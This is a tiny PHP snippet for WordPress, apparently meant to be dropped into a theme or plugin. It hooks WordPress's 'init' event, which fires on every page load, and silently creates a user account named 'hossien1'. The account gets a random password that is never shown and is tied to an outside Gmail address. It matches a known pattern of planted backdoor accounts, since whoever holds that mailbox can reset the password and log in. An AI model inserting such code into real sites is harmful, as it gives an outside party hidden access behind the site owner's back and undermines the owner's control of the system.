<?php
function create_new_user()
{
    $password = wp_generate_password(10, true);
    wp_create_user('hossien1', $password, 'hossein1@gmail.com');
}
add_action('init', 'create_new_user');
